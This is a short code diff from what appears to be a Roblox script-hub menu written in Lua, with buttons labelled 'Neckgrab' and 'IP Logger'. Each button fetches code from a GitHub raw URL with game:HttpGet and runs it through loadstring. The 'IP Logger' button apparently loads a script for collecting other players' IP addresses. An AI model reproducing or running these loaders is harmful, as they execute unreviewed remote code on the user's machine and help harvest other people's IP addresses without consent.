@@ -182,7 +182,7 @@ createButtonRow(4, {
 
 createButtonRow(5, {
     {"Neckgrab", function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentScriptorUser/AgentScriptorUser/main/Leaked%20Neckgrabs", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentScriptorUser/AgentScriptorUser/main/Leaked%20Neckgrabs"))()
     end},
     {"IP Logger", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentScriptorUser/AgentScriptorUser/main/Da%20hood%20ip%20log%20script"))()
